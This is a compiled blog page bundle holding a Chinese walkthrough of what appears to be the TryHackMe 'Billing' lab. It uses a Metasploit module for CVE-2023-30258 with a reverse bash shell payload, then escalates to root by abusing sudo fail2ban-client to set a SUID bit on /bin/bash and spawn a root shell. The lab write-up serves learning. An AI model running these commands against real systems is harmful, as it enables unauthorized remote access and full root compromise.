import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,b as a,o as t}from"./app-XK3nBo4k.js";const n={};function l(r,i){return t(),s("div",null,i[0]||(i[0]=[a('<h2 id="_1-前言" tabindex="-1"><a class="header-anchor" href="#_1-前言"><span>1. 前言</span></a></h2><p>本题运用了简单的<a href="https://eldstal.se/advisories/230327-magnusbilling.html" target="_blank" rel="noopener noreferrer">CVE-2023-30258</a>漏洞，这是一个简单的远程命令执行漏洞</p><h2 id="_2-复现步骤" tabindex="-1"><a class="header-anchor" href="#_2-复现步骤"><span>2. 复现步骤</span></a></h2><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell"><span>反弹shell</span></a></h3><p>这个漏洞已经在msf中收录了<br><code>msfconsole</code></p><figure><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110506.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">show</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> targets</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110536.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PAYLOAD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cmd/unix/reverse_bash</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>设置payload，然后设置Rhost Rport Lhost以及Lport<br> 设置好监听接口以及payload之后，msf会自动接收反向shell<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112352.png" alt="image.png" loading="lazy"></p><h3 id="提权" tabindex="-1"><a class="header-anchor" href="#提权"><span>提权</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">id</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>查看当前用户权限<br> 查看当前进程</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>ps -aux | grep fail</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112734.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p><strong>fail2ban-client</strong> 是一个命令行界面，它允许我们与 <strong>fail2ban-server</strong> 进行交互、配置和控制。简单说明一下，<strong>fail2ban</strong> 是一种安全工具，可以监控日志文件中的可疑活动（例如重复失败的登录尝试），并通过更新防火墙规则来禁止违规的 IP 地址。</p><p>使用 fail2ban-client，您可以与 Fail2ban 服务交互以执行作，例如启动或停止 jail、查看或更新设置以及检查服务器上不同 jail 的状态。从本质上讲，它可以帮助您控制服务器如何响应可疑活动以确保其安全。<a href="https://juggernaut-sec.com/fail2ban-lpe/#What_is_Fail2Ban" target="_blank" rel="noopener noreferrer">Fail2Ban – Linux 权限提升 - Juggernaut-sec</a></p><p><code>/etc/fail2ban/jail.local</code>，有这样的参数</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td><code>[asterisk-iptables]</code><br>enabled = true<br>filter = asterisk<br>action = iptables-allports<code>[name=ASTERISK, port=all, protocol=all]</code><br>logpath = /var/log/asterisk/messages<br>maxretry = 5<br>bantime = 600</td></tr><tr><td></td><td></td></tr></tbody></table><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sudo /usr/bin/fail2ban-client status</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>查看当前的防火墙规则<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326113233.png" alt="image.png" loading="lazy"><br> 有 8 个活动的 jail<br><code>Jails</code>基本上是定义要监控的日志、要查找的模式以及匹配模式时要采取的作的配置。</p><p>关键命令</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/bin/fail2ban-client</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> asterisk-iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> action</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> iptables-allports-ASTERISK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> actionban</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;chmod +s /bin/bash&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这段命令会启动<code>fail2ban-client</code>设置<code>asterisk-iptables</code>规则的<code>action</code>项，在action项中添加actionban，这条命令会在执行恶意操作的时候尝试执行</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/bin/fail2ban-client</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> asterisk-iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> action</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> iptables-allports-ASTERISK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> actionban</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>查看<code>asterisk-iptables</code>的<code>action</code>项的actionban配置的内容</p><p>现在，我们可以手动禁止 <strong>asterisk-iptables</strong> jail 的 IP 地址，它将执行 action 中定义的命令。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">iptables-allports-ASTERISK</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/bin/fail2ban-client</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> asterisk-iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> banip</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1.2.3.4</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这条命令的作用是将 IP 地址 <code>1.2.3.4</code> 添加到 <code>asterisk-iptables</code> jail 的禁止列表中。从而触发actionban中的降shell权的操作</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">/bin/bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li><strong><code>-p</code> 选项</strong>：启用特权模式（Privileged Mode）。</li><li></li><li><strong>特权模式的作用</strong>： <ul><li><strong>忽略启动文件</strong>：在特权模式下，Bash 会忽略用户的启动文件（如 <code>.bashrc</code>、<code>.bash_profile</code> 等），直接进入交互模式。</li><li><strong>增强安全性</strong>：这种模式通常用于需要更高安全性的场景，例如在某些受限环境中运行脚本时，避免加载用户自定义的配置文件，从而减少潜在的安全风险。</li></ul></li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">python3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;import os;import pty;os.setuid(0);os.setgid(0);pty.spawn(&quot;/bin/bash&quot;);&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="python3-c" tabindex="-1"><a class="header-anchor" href="#python3-c"><span><strong><code>python3 -c</code></strong></span></a></h4><ul><li><strong>作用</strong>：使用 Python 3 解释器执行一行代码。</li><li><strong><code>-c</code></strong>：从命令行参数中读取 Python 代码并执行。</li></ul><h4 id="import-os-import-pty" tabindex="-1"><a class="header-anchor" href="#import-os-import-pty"><span><strong><code>import os; import pty</code></strong></span></a></h4><ul><li><strong><code>import os</code></strong>：导入 Python 的 <code>os</code> 模块，用于执行操作系统相关的操作。</li><li><strong><code>import pty</code></strong>：导入 Python 的 <code>pty</code> 模块，用于创建伪终端。</li></ul><h4 id="os-setuid-0" tabindex="-1"><a class="header-anchor" href="#os-setuid-0"><span><strong><code>os.setuid(0)</code></strong></span></a></h4><ul><li><strong>作用</strong>：将当前进程的用户 ID 设置为 0（root 用户）。</li><li><strong>安全风险</strong>：如果当前进程已经具有 root 权限，这将使后续操作以 root 权限执行。如果当前进程没有 root 权限，这将引发权限错误。</li></ul><h4 id="os-setgid-0" tabindex="-1"><a class="header-anchor" href="#os-setgid-0"><span><strong><code>os.setgid(0)</code></strong></span></a></h4><ul><li><strong>作用</strong>：将当前进程的组 ID 设置为 0（root 组）。</li><li><strong>安全风险</strong>：与 <code>os.setuid(0)</code> 类似，这将使后续操作以 root 组权限执行。</li></ul><h4 id="pty-spawn-bin-bash" tabindex="-1"><a class="header-anchor" href="#pty-spawn-bin-bash"><span><strong><code>pty.spawn(&quot;/bin/bash&quot;)</code></strong></span></a></h4><ul><li><strong>作用</strong>：启动一个新的交互式 Bash shell。</li><li><strong>安全风险</strong>：如果前面的 <code>os.setuid(0)</code> 和 <code>os.setgid(0)</code> 成功执行，这个命令将以 root 权限启动一个交互式 shell，攻击者可以利用这个 shell 执行任意命令。</li></ul><p>这条命令是一个非常危险的命令，它试图以 root 权限启动一个交互式的 Bash shell。</p>',46)]))}const o=e(n,[["render",l],["__file","billing.html.vue"]]),p=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/THM/billing.html","title":"billing","lang":"zh-CN","frontmatter":{"icon":"pen-to-square","date":"2025-03-26T00:00:00.000Z","tags":null,"title":"billing","category":["项目"],"description":"1. 前言 本题运用了简单的CVE-2023-30258漏洞，这是一个简单的远程命令执行漏洞 2. 复现步骤 反弹shell 这个漏洞已经在msf中收录了 msfconsole image.pngimage.png image.pngimage.png image.pngimage.png 设置payload，然后设置Rhost Rport Lhost...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/THM/billing.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"billing"}],["meta",{"property":"og:description","content":"1. 前言 本题运用了简单的CVE-2023-30258漏洞，这是一个简单的远程命令执行漏洞 2. 复现步骤 反弹shell 这个漏洞已经在msf中收录了 msfconsole image.pngimage.png image.pngimage.png image.pngimage.png 设置payload，然后设置Rhost Rport Lhost..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-03-26T14:12:26.000Z"}],["meta",{"property":"article:published_time","content":"2025-03-26T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-03-26T14:12:26.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"billing\\",\\"image\\":[\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110506.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110536.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112352.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112734.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326113233.png\\"],\\"datePublished\\":\\"2025-03-26T00:00:00.000Z\\",\\"dateModified\\":\\"2025-03-26T14:12:26.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"1. 前言","slug":"_1-前言","link":"#_1-前言","children":[]},{"level":2,"title":"2. 复现步骤","slug":"_2-复现步骤","link":"#_2-复现步骤","children":[{"level":3,"title":"反弹shell","slug":"反弹shell","link":"#反弹shell","children":[]},{"level":3,"title":"提权","slug":"提权","link":"#提权","children":[]}]}],"git":{"createdTime":1742958273000,"updatedTime":1742998346000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":20,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":3.35,"words":1004},"filePathRelative":"article/01_项目/THM/billing.md","localizedDate":"2025年3月26日","excerpt":"<h2>1. 前言</h2>\\n<p>本题运用了简单的<a href=\\"https://eldstal.se/advisories/230327-magnusbilling.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">CVE-2023-30258</a>漏洞，这是一个简单的远程命令执行漏洞</p>\\n<h2>2. 复现步骤</h2>\\n<h3>反弹shell</h3>\\n<p>这个漏洞已经在msf中收录了<br>\\n<code>msfconsole</code></p>\\n<figure><img src=\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png\\" alt=\\"image.png\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image.png</figcaption></figure>","autoDesc":true}');export{o as comp,p as data};
